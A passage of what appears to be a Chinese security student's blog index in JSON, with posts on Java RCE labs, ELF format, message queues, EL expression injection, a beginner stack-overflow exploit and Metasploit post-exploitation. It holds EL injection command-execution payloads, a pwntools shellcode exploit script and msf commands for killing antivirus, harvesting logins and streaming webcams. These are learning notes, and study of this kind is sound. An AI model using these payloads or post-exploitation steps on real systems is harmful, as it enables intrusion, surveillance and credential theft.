&lt;password&gt;&quot; % progName print &quot; %s analyse &lt;stego_file&gt;&quot; % progName sys.exit() if __name__ &#x3D;&#x3D; &quot;__main__&quot;: if len(sys.argv) &lt; 3: usage(sys.argv[0]) if sys.argv[1] &#x3D;&#x3D; &quot;hide&quot;: embed(sys.argv[2], sys.argv[3], sys.argv[4]) elif sys.argv[1] &#x3D;&#x3D; &quot;extract&quot;: extract(sys.argv[2], sys.argv[3], sys.argv[4]) elif sys.argv[1] &#x3D;&#x3D; &quot;analyse&quot;: analyse(sys.argv[2]) else: print &quot;[-] Invalid operation specified&quot; crypto.py: 12345678910111213141516171819202122232425262728293031import hashlibfrom Crypto import Randomfrom Crypto.Cipher import AES&#39;&#39;&#39;Thanks tohttp:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;12524994&#x2F;encrypt-decrypt-using-pycrypto-aes-256&#39;&#39;&#39;class AESCipher: def __init__(self, key): self.bs &#x3D; 32 # Block size self.key &#x3D; hashlib.sha256(key.encode()).digest() # 32 bit digest def encrypt(self, raw): raw &#x3D; self._pad(raw) iv &#x3D; Random.new().read(AES.block_size) cipher &#x3D; AES.new(self.key, AES.MODE_CBC, iv) return iv + cipher.encrypt(raw) def decrypt(self, enc): iv &#x3D; enc[:AES.block_size] cipher &#x3D; AES.new(self.key, AES.MODE_CBC, iv) return self._unpad(cipher.decrypt(enc[AES.block_size:])) def _pad(self, s): return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs) @staticmethod def _unpad(s): return s[:-ord(s[len(s)-1:])] bmp在工具集-隐写-PDF隐写，使用wbStego4.3，选择decode，然后选择bmp, 打开bmp文件，continue后输入密码123456，continue后输入生成的文件1.txt. 之后continue就行。打开1.txt即可。","categories":[{"name":"CTF入门","slug":"CTF入门","permalink":"https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"涅普CTF入门-misc（一）","slug":"涅普CTF入门-misc（一）","permalink":"https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%B8%80%EF%BC%89/"}],"keywords":[{"name":"CTF入门","slug":"CTF入门","permalink":"https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"}]},{"title":"java-sec-code-学习（二）","slug":"java-sec-code-学习（二）","date":"2021-01-29T09:17:08.000Z","updated":"2021-03-17T13:37:03.861Z","comments":true,"path":"2021/01/29/java-sec-code-学习（二）/","link":"","permalink":"https://ggyggy666.github.io/2021/01/29/java-sec-code-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"昨天配置好了环境，今天就来学习一下RCE。","text":"昨天配置好了环境，今天就来学习一下RCE。 运行http://localhost:8080/java-sec/rce/exec?cmd=whoami 即可看到输出了用户名。 代码12345678910111213public String CommandExec(String cmd) &#123; Runtime run &#x3D; Runtime.getRuntime(); StringBuilder sb &#x3D; new StringBuilder(); try &#123; Process p &#x3D; run.exec(cmd); BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream()); BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in)); String tmpStr; while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123; sb.append(tmpStr); &#125; 定义了一个CommandExec类，输入是cmd，字符串类型。 定义一个Runtime类型的run, 为了让其调用exec从而执行命令。即run.exec(cmd) 定义了一个字符串序列对象sb, 它有：append()、insert()、reverse()、setCharAt()、setLength()等方法，最终使用toString()方法返回 try部分，先是定义一个Process类，创建一个进程来执行命令。然后定义一个BufferedInputStream对象来获取进程输出的内容并放到缓冲区中，之后使用BufferedReader来读取缓冲区中的内容。使用readLine()一行一行读取，如果读取的内容非空就放到sb中。这个过程就相当于将子进程执行的命令后输出的内容添加到字符串对象sb中，最后使用return sb.toString()输出就行了。 注意到后面的p.waitFor()，其实是process创建子进程后，为了让子进程完全执行命令获得输出，主进程就需要等待，因此需要p.waitFor。返回值是0说明子进程已经执行成功，如果非0就出现了问题。 12inBr.close();in.close(); 执行完毕记得需要关闭缓冲区读取与读入。 先知Java RCE学习文章：https://xz.aliyun.com/t/7995 下载好源码后，使用IDEA打开。","categories":[{"name":"java安全","slug":"java安全","permalink":"https://ggyggy666.github.io/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"java-sec-code-学习（二）","slug":"java-sec-code-学习（二）","permalink":"https://ggyggy666.github.io/tags/java-sec-code-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"}],"keywords":[{"name":"java安全","slug":"java安全","permalink":"https://ggyggy666.github.io/categories/java%E5%AE%89%E5%85%A8/"}]},{"title":"java-sec-code 学习（一）","slug":"java-sec-code-学习（一）","date":"2021-01-28T04:39:40.000Z","updated":"2021-03-17T13:37:08.242Z","comments":true,"path":"2021/01/28/java-sec-code-学习（一）/","link":"","permalink":"https://ggyggy666.github.io/2021/01/28/java-sec-code-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"放假回到家了，开始学习java漏洞。","text":"放假回到家了，开始学习java漏洞。 项目地址https://github.com/JoyChou93/java-sec-code/blob/master/README_zh.md 环境配置 在Windows的git下，使用命令： git clone https://github.com/JoyChou93/java-sec-code &amp; cd java-sec-code 将源代码下载下来。 进入到java-sec-code目录后，右键打开powershell, 执行: mvn clean package, 注意，没有mvn的需要安装mvn并添加到环境变量中。 发现没有编译器，出错了。原因是pom.xml中没有指定我们本地的java环境的JDK。 参考了https://blog.csdn.net/qq_40685457/article/details/103888830, 在pom.xml中加东西。 123456789101112&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt; &lt;version&gt;3.1&lt;&#x2F;version&gt; &lt;configuration&gt; &lt;verbose&gt;true&lt;&#x2F;verbose&gt; &lt;fork&gt;true&lt;&#x2F;fork&gt; &lt;source&gt;1.8&lt;&#x2F;source&gt; &lt;target&gt;1.8&lt;&#x2F;target&gt; &lt;executable&gt;D:&#x2F;jdk1.8&#x2F;bin&#x2F;javac&lt;&#x2F;executable&gt; &lt;&#x2F;configuration&gt; &lt;&#x2F;plugin&gt; 继续执行mvn clean package 又报错了，无法执行编译器。注意到版本号是3.1。 参考了https://blog.csdn.net/maker6/article/details/107707407, 不过是改成3.1。 123456789&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt; &lt;version&gt;3.1&lt;&#x2F;version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;&#x2F;source&gt; &lt;target&gt;1.8&lt;&#x2F;target&gt; &lt;&#x2F;configuration&gt; &lt;&#x2F;plugin&gt; 还是报错了。 最后，指定了另一个JDK就好了。（上面的在pom.xml里加的都没有用。。） 原来的JDK： 另一个JDK： 可以看到原来的JDK其实是不完整的。 还要注意，在IDEA里运行需要配置Tomcat，就需要在deployment中+一个.war包。默认是没有的。首先需要到pom.xml中的开头将jar修改成war，之后点击IDEA的左下角 看到右侧的package，双击，等待一段时间后会生成一个.war包，然后将其复制到tomacat的webapps目录下。在Tomcat配置的deployment中+ 之后便可运行了。 打开链接：http://localhost:8080/java_sec_code_1_0_0_war/,即可看到登录界面 使用：admin/admin123登录成功。","categories":[{"name":"java安全","slug":"java安全","permalink":"https://ggyggy666.github.io/categories/java%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"java-sec-code 学习（一）","slug":"java-sec-code-学习（一）","permalink":"https://ggyggy666.github.io/tags/java-sec-code-%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"}],"keywords":[{"name":"java安全","slug":"java安全","permalink":"https://ggyggy666.github.io/categories/java%E5%AE%89%E5%85%A8/"}]},{"title":"pwn入门-ELF文件格式","slug":"pwn入门-ELF文件格式","date":"2021-01-17T10:40:23.000Z","updated":"2021-01-18T02:20:12.076Z","comments":true,"path":"2021/01/17/pwn入门-ELF文件格式/","link":"","permalink":"https://ggyggy666.github.io/2021/01/17/pwn%E5%85%A5%E9%97%A8-ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/","excerpt":"","text":"放假了，开始学习新的东西。昨天和今天在XCTF上混了一下，发现pwn的CTF题目好难，还是得好好学习一下。 概念ELF，Executable and Linking Format。是Linux系统上的主要可执行文件格式。 种类 可重定位文件：有代码和数据，用于与其他目标文件一起链接得到可执行文件，就是gcc -c后得到的编译之后的文件。 可执行文件：包含了程序创建进程映像所需要的东西。 共享目标文件：可以被链接，也可以执行。 格式 ELF包括header、sections、header。而第一个header又包括ELF header 和 Program Header table. sections包括代码code和数据data还有每个Section的名字；最后的header代表Section Header table。下面一一分析： 通常的结构如上图。 ELF header：记录了整个ELF文件的结构信息。 Program header table：描述文件中的各种section节的信息，告诉系统如何创建进程。 sections: 各种section节，包含代码节和数据节、符号和字符串等。针对链接过程，可以忽略Program header table，Section header table必须存在；针对运行过程，可以忽略Section header table，Program header table必须存在。如果是用于链接的，必须要有这个sections。 Section header table：包含了各个section节的信息。每个section在这里都有一个表项。 之所以说section是节而不是段，是因为ELF文件是保存在磁盘中，是在外存的。运行时被装入内存中，各个节才会组成段segment。 ELF header结构如下： e_ident: 判断是否是ELF文件，文件首部存在4个字节：0x7F,’E’,’L’,’F’。 e_type: 指定文件类型，主要有ET_REL、ET_EXEC、ET_DYN三种。 e_maching: 描述elf文件支持的体系结构。EM_386和EM_X86_64. e_version：描述版本。 e_entry: 程序入口的虚拟地址。 e_phoff: program header table在文件中的位置（偏移）。 e_shoff: section header table在文件中的位置（偏移）。 e_flags: 保存与文件关联的特点处理器的标志。 e_ehsize: ELF header的大小。 e_phentsize: program header table的每个表项的大小。 e_phnum: program header table表项个数。 e_shentsize: section header table的每个表项的大小。 e_shnum: section header table表项个数。 e_shstrndx: 表示字符串表这个section在section header table中的索引。 磁盘ELF文件与内存ELF映像 RW是指有可读可写的权限，节共有：.data, .bss, .got.plt，它们在内存中组合成了数据段。 RX是指有可读可执行的权限，节共有：.rodata, .text, .init, ELF Header, 它们在内存中组合成了代码段。 为什么rodata也是在代码段之中？因为它没有写权限。","categories":[{"name":"pwn","slug":"pwn","permalink":"https://ggyggy666.github.io/categories/pwn/"}],"tags":[{"name":"pwn入门-ELF文件格式","slug":"pwn入门-ELF文件格式","permalink":"https://ggyggy666.github.io/tags/pwn%E5%85%A5%E9%97%A8-ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"}],"keywords":[{"name":"pwn","slug":"pwn","permalink":"https://ggyggy666.github.io/categories/pwn/"}]},{"title":"MQ队列-C++实现","slug":"MQ队列-C-实现","date":"2021-01-01T08:24:29.000Z","updated":"2021-01-01T10:06:53.898Z","comments":true,"path":"2021/01/01/MQ队列-C-实现/","link":"","permalink":"https://ggyggy666.github.io/2021/01/01/MQ%E9%98%9F%E5%88%97-C-%E5%AE%9E%E7%8E%B0/","excerpt":"","text":"由于实验需要用到实时监控，使得一个进程输出内容时，另一个进程能接收到，因此开始学习进程间的通信——MQ队列。 原理MQ队列，其实就是生产者和消费者模型的实现。二者共享一块内存，生产者产出数据放到内存中，消费者从中取出数据。 安装boost库如果是源代码安装，会很麻烦并且可能最后根本就安装不成功。可以直接一条命令： apt-get install libboost-dev 生产者123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include&lt;boost&#x2F;interprocess&#x2F;ipc&#x2F;message_queue.hpp&gt;int main()&#123; try &#123; char MessageStr[100]&#x3D;&quot;Hello World&quot;; &#x2F;&#x2F;先把之前的队列清除 boost::interprocess::message_queue::remove(&quot;Message_Queue&quot;); &#x2F;&#x2F;创建一个消息队列,create_only boost::interprocess::message_queue My_mq(boost::interprocess::create_only, &quot;Message_Queue&quot;, 100, sizeof(MessageStr)); &#x2F;&#x2F;发送100条消息 for (int i &#x3D; 0; i &lt; 10; i++) &#123; std::cout &lt;&lt; &quot;Please input the Send Message:&quot;; std::string data; std::getline(std::cin, data);&#x2F;&#x2F;输入要发送的消息 memcpy(MessageStr, data.c_str(),sizeof(data)); &#x2F;&#x2F;根据消息的大小分配内存空间 std::cout &lt;&lt; MessageStr &lt;&lt; std::endl; My_mq.send(&amp;MessageStr, sizeof(MessageStr), 0); &#x2F;&#x2F;发送消息 &#125; &#125; catch (boost::interprocess::interprocess_exception&amp; e) &#123; std::cout &lt;&lt; e.what() &lt;&lt; std::endl; return 1; &#125; return 0;&#125; 需要注意的是，即使include了那个message_queue.hpp头文件，还是需要在变量前使用：boost::interprocess::。而且编译时使用g++, 还要注意使用-pthread -lrt，否则会出错： g++ produce.cpp -o produce -pthread -lrt 消费者123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;cstring&gt;#include&lt;boost&#x2F;interprocess&#x2F;ipc&#x2F;message_queue.hpp&gt;#include&lt;vector&gt;int main()&#123; try &#123; char MessageStr[100] &#x3D; &quot;Hello World&quot;; &#x2F;&#x2F;打开消息队列，open_only boost::interprocess::message_queue My_mq(boost::interprocess::open_only, &quot;Message_Queue&quot;); &#x2F;&#x2F;定义一个优先级 unsigned priority; &#x2F;&#x2F;定义一个接收的数据的大小 boost::interprocess::message_queue::size_type received_size; &#x2F;&#x2F;接收消息并输出 while (true) &#123; My_mq.receive(&amp;MessageStr, sizeof(MessageStr), received_size, priority); std::cout &lt;&lt; &quot;Recive Message:&quot; &lt;&lt; MessageStr &lt;&lt; std::endl; &#125; &#125; catch (boost::interprocess::interprocess_exception&amp; e) &#123; std::cout &lt;&lt; e.what() &lt;&lt; std::endl; return 1; &#125;&#125; 要求跟生产者一样。","categories":[{"name":"MQ队列-C++实现","slug":"MQ队列-C-实现","permalink":"https://ggyggy666.github.io/categories/MQ%E9%98%9F%E5%88%97-C-%E5%AE%9E%E7%8E%B0/"}],"tags":[{"name":"MQ队列-C++实现","slug":"MQ队列-C-实现","permalink":"https://ggyggy666.github.io/tags/MQ%E9%98%9F%E5%88%97-C-%E5%AE%9E%E7%8E%B0/"}],"keywords":[{"name":"MQ队列-C++实现","slug":"MQ队列-C-实现","permalink":"https://ggyggy666.github.io/categories/MQ%E9%98%9F%E5%88%97-C-%E5%AE%9E%E7%8E%B0/"}]},{"title":"表达式注入--EL表达式","slug":"表达式注入-EL表达式","date":"2020-12-25T11:56:27.000Z","updated":"2020-12-25T12:55:54.238Z","comments":true,"path":"2020/12/25/表达式注入-EL表达式/","link":"","permalink":"https://ggyggy666.github.io/2020/12/25/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-EL%E8%A1%A8%E8%BE%BE%E5%BC%8F/","excerpt":"","text":"好久没更新博客了，今天有空来学习一下EL表达式注入。 EL概述EL是一种语言，为了简化JSP的写法。它的功能有四个： 获取数据：替换JSP页面的脚本表达式，使用${user}等形式获取数据。 执行运算：在JSP页面执行一些基本的运算，如：${100-99}，执行后页面应该返回1. 获取对象：EL表达式定义了一些隐式对象，通过EL获取对象之后就可以直接访问其中数据。 调用JAVA方法：可以通过${np: 函数名(参数)}调用方法，np是值命名空间。 JSP形式 JSP表达式：&lt;%=变量或表达式%&gt; JSP脚本：&lt;%JAVA代码%&gt; JSP声明：&lt;%!变量或方法%&gt; JSP注释：&lt;%!–JSP注释–%&gt; EL的使用查找变量值返回想要获取某个变量的值：${username}, 但是这个username没有指定范围，不知道它是哪里的username（默认是在page)。这时候就得涉及到EL的查找范围了。 page，页面范围内，使用pageScope去调用访问，如：${pageScope.username}, 还有：${pageScope.objectName.attributeName}, 访问某个对象的属性。 request, 请求范围内，使用requestScope。 session，会话范围内，使用sessionScope application, 应用范围内，使用applicationScope 获取隐式对象pageContext, JSP页面的上下文，可以用于访问隐式变量（以下），如${pageContext.response}为页面的响应对象赋值，${pageContext.request.queryString}，返回请求的参数和值，即：name=xxx。 param，请求参数，单个，${param.name}, 返回请求参数name的值 paramValues，请求参数，数值数组。${paramValues.name}，返回字符串数组 header，头部，单个，${header.name} headerValues，头部，数值数组,${headerValues.name}` cookie，单个cookie对象, ${cookie.name.value}, 如果是多个同名的cookie，用：${headerValues.name} initParam，将上下文初始化参数名称映射到单个值。 注意：有些变量不能用.访问，必须用[], 如：${header[“user-Agent”]} 调用JAVA方法12345public class ELFunc &#123; public static String doSomething(String str)&#123; return str + &quot;.com&quot;; &#125;&#125; 创建一个类ELFunc, 其中有一个doSomething方法。这个类和方法必须在WEB-INF下新建一个test.tld文件中指定。 12345678910111213&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;taglib version&#x3D;&quot;2.0&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee http:&#x2F;&#x2F;java.sun.com&#x2F;xml&#x2F;ns&#x2F;j2ee&#x2F;web-jsptaglibrary_2_0.xsd&quot;&gt; &lt;tlib-version&gt;1.0&lt;&#x2F;tlib-version&gt; &lt;short-name&gt;ELFunc&lt;&#x2F;short-name&gt; &lt;uri&gt;http:&#x2F;&#x2F;www.mi1k7ea.com&#x2F;ELFunc&lt;&#x2F;uri&gt; &lt;function&gt; &lt;name&gt;doSomething&lt;&#x2F;name&gt; &lt;function-class&gt;eltest.ELFunc&lt;&#x2F;function-class&gt; &lt;function-signature&gt; java.lang.String doSomething(java.lang.String)&lt;&#x2F;function-signature&gt; &lt;&#x2F;function&gt;&lt;&#x2F;taglib&gt; 然后在JSP文件中，先头部导入taglib标签库，URI为test.tld中设置的URI地址，prefix为test.tld中设置的short-name，然后直接在EL表达式中使用类名:方法名()的形式来调用该类方法即可： 12&lt;%@taglib uri&#x3D;&quot;http:&#x2F;&#x2F;www.mi1k7ea.com&#x2F;ELFunc&quot; prefix&#x3D;&quot;ELFunc&quot;%&gt;$&#123;ELFunc:doSomething(&quot;mi1k7ea&quot;)&#125; 启动或禁用EL表达式全局禁用打开web.xml文件，进行如下配置： 123456&lt;jsp-config&gt; &lt;jsp-property-group&gt; &lt;url-pattern&gt;*.jsp&lt;&#x2F;url-pattern&gt; &lt;el-ignored&gt;true&lt;&#x2F;el-ignored&gt; &lt;&#x2F;jsp-property-group&gt;&lt;&#x2F;jsp-config&gt; el-ignored标签中的值设置为true即禁用，false即启用。 局部禁用对于单个JSP文件。 1&lt;%@ page isELIgnored&#x3D;&quot;true&quot; %&gt; EL表达式注入漏洞原理使用表达式，提供外部接口，并且对外部输入没有进行严格过滤，导致攻击者可以输入恶意表达式从而执行。 检测使用运算： http://xxx.com/xx.jsp?user=${2-1} 返回1，便是执行了减法运算。然后搜索页面HTML代码看这个1在哪输出了。 使用POC： 123456789101112&#x2F;&#x2F;对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）$&#123;pageContext&#125;&#x2F;&#x2F;获取Web路径$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;&#x2F;&#x2F;文件头参数$&#123;header&#125;&#x2F;&#x2F;获取webRoot$&#123;applicationScope&#125;&#x2F;&#x2F;执行命令$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;).getInputStream())&#125;&#x2F;&#x2F;任意代码执行$&#123;pageContext.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc.exe&quot;))&#125; 漏洞CVE-2011-2730乌云上的漏洞案例https://www.secshi.com/goto/wqmz https://www.secshi.com/goto/q1hy 绕过方法利用反射机制即前面的POC 利用ScriptEngine调用JS引擎同SpELl注入 1$&#123;&#39;&#39;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&#39;calc&#39;)&quot;)&#125; 防御 不使用外部输入作为表达式内容 严格过滤输入 对源代码排查 EL部分的内容在javax.el包中，这个包在JUEL相关包中，源代码直接搜索： 12javax.el.ExpressionFactory.createValueExpression()javax.el.ValueExpression.getValue() 参考https://xz.aliyun.com/t/7692 https://www.cnblogs.com/xdp-gacl/p/3938361.html","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"表达式注入--EL表达式","slug":"表达式注入-EL表达式","permalink":"https://ggyggy666.github.io/tags/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-EL%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"pwn入门-最简单的溢出","slug":"pwn入门-最简单的溢出","date":"2020-11-07T12:55:45.000Z","updated":"2020-11-08T12:53:11.781Z","comments":true,"path":"2020/11/07/pwn入门-最简单的溢出/","link":"","permalink":"https://ggyggy666.github.io/2020/11/07/pwn%E5%85%A5%E9%97%A8-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%BA%A2%E5%87%BA/","excerpt":"","text":"折腾许久，终于完成了第一次最简单的溢出。教程按照：https://www.yuque.com/hxfqg9/bin/zzg02e ，但是由于没有pattern.py, 使用的是cyclic，因此有点差异。 源码12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function()&#123;char buf[128];read(STDIN_FILENO, buf, 256);&#125;int main(int argc, char** argv)&#123;vulnerable_function();write(STDOUT_FILENO, &quot;Hello, World\\n&quot;, 13);&#125; 保存为level1.c后 关闭NX、DEP、ASLR编译: 1gcc -m32 -no-pie -fno-stack-protector -z execstack -o level1 level1.c -m32表示编译32位的程序 -fno-stack-protector 表示关掉堆栈保护 -z execstack 表示数据所在页不可执行 -no-pie 表示关闭PIE 还需要关掉ASLR 1echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space 使用checksec检查保护机制 1checksec level1 运行首先在任意目录下，输入命令： 1cyclic 150 &#x2F;&#x2F;没有pattern.py,直接使用cyclic 150生成150个字母 然后gdb进行调试 12gdb .&#x2F;level1r 然后将上面的150个字符复制作为输入 执行完发现报错了，得到一个地址：0x6261616b ，这个就是函数返回地址，因为输入的数据太多了导致覆盖了函数返回地址从而出错。 接着根据这个返回地址计算出缓冲区内的分配的数据空间大小： 1cyclic -l 0x6261616b 得到140，说明分配的数据空间大小是140个字符。现在我们来看一下堆栈结构： 可以知道，返回地址上面还有一个EBP，4个字节，再上面才是数据空间。 因此如果我们将函数返回地址覆盖成shellcode所在的起始地址，就可以执行shellcode了。 注意：还有一个问题，虽然关闭了ASLR，但是我们上面测试看到的地址只是在gdb环境下调试得到的，真实的地址会是其它位置 ，因此需要开启core dump: 12345ulimit -c unlimited &#x2F;&#x2F;开启内存错误转储cyclic 150 &#x2F;&#x2F;得到150个字符.&#x2F;level1输入150个字符，报错ls &#x2F;&#x2F;即可看到core 生成一个core文件在当前目录 1gdb level1 core 进入gdb后，查看shellcode应该放入的地址 1x&#x2F;10s $esp-144 关于为什么是144，上面图也可以看出来了，还有一个EBP的存在。140+4 从而得到shellcode的地址是：0xffffd000 可以写脚本了 exp脚本1234567from pwn import *p &#x3D; process(&#39;.&#x2F;level1&#39;) &#x2F;&#x2F;脚本与level1在同一目录下ret &#x3D; 0xffffd000shellcode &#x3D; asm(shellcraft.sh())payload &#x3D; shellcode.ljust(140,&#39;a&#39;) + p32(ret)p.send(payload)p.interactive() 这个是用shellcraft.sh()自动生成的shellcode 123456789from pwn import *p &#x3D; process(&#39;.&#x2F;level1&#39;)ret &#x3D; 0xffffd000shellcode &#x3D; &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot;shellcode +&#x3D; &quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot;shellcode +&#x3D; &quot;\\x0b\\xcd\\x80&quot;payload &#x3D; shellcode + &#39;A&#39; * (140 - len(shellcode)) + p32(ret)p.send(payload)p.interactive() 这个是自己编写的shellcode。 利用1python exp.py 即可看到执行成功了。","categories":[{"name":"pwn","slug":"pwn","permalink":"https://ggyggy666.github.io/categories/pwn/"}],"tags":[{"name":"pwn入门-最简单的溢出","slug":"pwn入门-最简单的溢出","permalink":"https://ggyggy666.github.io/tags/pwn%E5%85%A5%E9%97%A8-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%BA%A2%E5%87%BA/"}],"keywords":[{"name":"pwn","slug":"pwn","permalink":"https://ggyggy666.github.io/categories/pwn/"}]},{"title":"pwn入门-环境安装","slug":"pwn入门-环境安装","date":"2020-11-06T14:55:25.000Z","updated":"2020-11-08T12:53:06.306Z","comments":true,"path":"2020/11/06/pwn入门-环境安装/","link":"","permalink":"https://ggyggy666.github.io/2020/11/06/pwn%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/","excerpt":"","text":"今天学习pwn 环境准备Ubuntu系统 pwntools pwndbg IDA ipython gcc-multilib 123456789101112131415161718sudo apt-get install python-pipsudo apt-get install python3-pipcd ~mkdir .pip &amp; cd .pipvim pip.conf[global]index-url &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simplepip install pwntoolsgit clone https:&#x2F;&#x2F;gitee.com&#x2F;ggy666&#x2F;GDB-Plugins.gitcd GDB-Plugins&#x2F;pwndbggit initchmod 777 .&#x2F;setup.sh.&#x2F;setup.sh (ubuntu18可以，ubuntu20一直报错)apt-get install gcc-multilib 安装pwntools: 123cd pwntoolspip install -r requirement.txtpython setup.py (root下执行) pwndbg: 12cd pwndbg.&#x2F;setup.sh IDA: 1234解压IDA到任意目录，然后sudo apt-get install libstdc++5:i386cd IDA.&#x2F;idaq 即可运行 其它可参考下面链接的配置 主要参考：https://www.yuque.com/hxfqg9/bin/zzg02e","categories":[{"name":"pwn","slug":"pwn","permalink":"https://ggyggy666.github.io/categories/pwn/"}],"tags":[{"name":"pwn入门-环境安装","slug":"pwn入门-环境安装","permalink":"https://ggyggy666.github.io/tags/pwn%E5%85%A5%E9%97%A8-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"}],"keywords":[{"name":"pwn","slug":"pwn","permalink":"https://ggyggy666.github.io/categories/pwn/"}]},{"title":"msf后渗透过程","slug":"msf后渗透过程","date":"2020-09-30T12:25:05.000Z","updated":"2020-09-30T13:11:03.702Z","comments":true,"path":"2020/09/30/msf后渗透过程/","link":"","permalink":"https://ggyggy666.github.io/2020/09/30/msf%E5%90%8E%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/","excerpt":"","text":"最近学习后渗透和内网渗透，在此理清一下思路。 msf模块 Auxiliaries, 辅助模块，用于扫描主机、端口、嗅探和指纹识别等信息收集。 Exploit，漏洞利用模块，针对一个存在的漏洞发起攻击的一段代码。 payload，攻击载荷模块，用于目标系统被渗透攻击之后运行的代码。 POST，后期渗透模块，渗透进内网后需要进行攻击所利用到的代码。 Encoders, 编码模块，用于免杀。 信息收集可以直接利用db_nmap, 使用nmap的方式进行扫描。或者使用辅助模块。 端口扫描： search portscan use auxiliary/scanner/portscan/tcp 使用TCP扫描 show options -&gt; set rhosts 主机地址 —&gt; set ports 1-500 -&gt; run 漏洞利用使用信息收集方式得到目标主机运行的服务后，尝试用exploit去攻击。比如知道了目标运行Samba服务，那么可以查找相应代码： 1234567search sambause exploit&#x2F;multi&#x2F;samba&#x2F;usermap_scriptset payload cmd&#x2F;unix&#x2F;reverse &#x2F;&#x2F;设置payloadset rhost xxset port 445set lhost 本地地址exploit 或者 run 后渗透进程迁移ps 获取目标主机运行的进程 getpid 获得当前渗透进目标的shell的进程号 migrate xx 找到一个进程号，迁移进去即可。 系统命令sysinfo 查看系统信息 run post/windows/gather/checkvm 检测目标是否是虚拟机 idletime 检测目标运行时间 route 查看网络路由 getuid 查看当前登录的用户 run post/windows/manage/killav 关闭目标的杀毒软件 run post/windows/manage/enable_rdp 启动目标的远程桌面协议，之后打开另一个命令行，使用rdesktop 目标地址进行远程桌面连接。 1234run post&#x2F;windows&#x2F;manage&#x2F;autoroutebackgroundroute add xx.xx.xx.xx 255.255.255.0 1route print 添加一条路由 run post/windows/gather/enum_logged_on_users 列举当前有多少用户登录 run post/windows/gather/enum_applications 列举安装的应用程序 run windows/gather/credentials/windows_autologin 抓取自动登录的用户名和密码 screenshot 截图 123webcam_list &#x2F;&#x2F;查看有无摄像头webcam_snap &#x2F;&#x2F;打开摄像头webcam_stream &#x2F;&#x2F;开启直播 shell 进入命令行 文件操作pwd 查看目标当前目录 getlwd 查看本机当前目录 ls 列出本机当前目录下的所有文件 search -f *.txt -d c:\\\\ 搜索C盘下所有以TXT结尾的文件 download c:\\\\test.txt /root 下载目标的test.txt到本机的root目录下 upload /root/test.txt c:\\\\ 将本机的test.txt上传到目标的C盘下。 提权12shell 进入命令行whoami &#x2F;groups 查看当前权限 利用溢出漏洞getuid 查看当前用户 shell进入后，命令行中输入： 